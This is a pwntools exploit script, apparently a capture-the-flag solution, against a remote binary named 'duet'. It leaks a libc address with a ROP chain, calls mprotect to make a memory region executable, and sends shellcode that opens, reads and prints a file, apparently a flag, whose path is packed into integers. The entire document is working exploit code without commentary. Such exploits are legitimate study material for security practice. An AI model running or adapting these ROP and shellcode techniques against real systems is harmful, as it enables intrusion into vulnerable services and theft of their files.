#!/usr/bin/python3

from pwn import *

libc = ELF('./libc-2.33.so', checksec=False)
exe = context.binary = ELF('./duet_patched', checksec=False)
context.log_level = 'debug'

# p = process(exe.path)
p = remote('45.32.110.58', 9999)

############################
### Stage 1: Preparation ###
############################
pop_rdi = 0x000000000040168b
pop_rsi_r15 = 0x0000000000401689

# Find libc address
payload = b'A'*24
payload += flat(
	pop_rdi, exe.got['puts'],
	exe.plt['puts'], exe.sym['vuln']
)
p.sendlineafter(b'stuff:', payload)
p.recvline()
puts_addr = u64(p.recvline()[:-1] + b'\x00\x00')
print(hex(puts_addr))
libc.address = puts_addr - libc.sym['puts']
print(hex(libc.address))

# Change permission and input shellcode
pop_rdx = libc.address + 0x00000000000c7f32
payload = b'A'*24
payload += flat(
	pop_rdi, 0x00000000404000,
	pop_rsi_r15, 0x1000, 0,
	pop_rdx, 7,
	libc.sym['mprotect'],
	pop_rdi, 0x00000000404a00,
	exe.plt['gets'],
	0x4015e9,
	0x00000000404a00
)
p.sendlineafter(b'stuff:', payload)

################################
### Stage 2: Input shellcode ###
################################
shellcode = asm('''
	mov rbp, 0x404500
	mov rdx, 8386599043768215599
	mov [rbp], rdx
	add rbp, 8
	mov rdx, 8371742425456455526
	mov [rbp], rdx
	add rbp, 8
	mov rdx, 29816
	mov [rbp], rdx
	sub rbp, 0x10

	mov rbx, rbp
	mov rcx, 0
	mov rdx, 0
	mov rax, 5
	int 0x80

	mov rdi, rax
	mov rsi, 0x404500
	mov rdx, 0x100
	xor rax, rax
	syscall

	mov rax, 1
	mov rdi, 1
	syscall
	''')
p.sendline(shellcode)

p.interactive()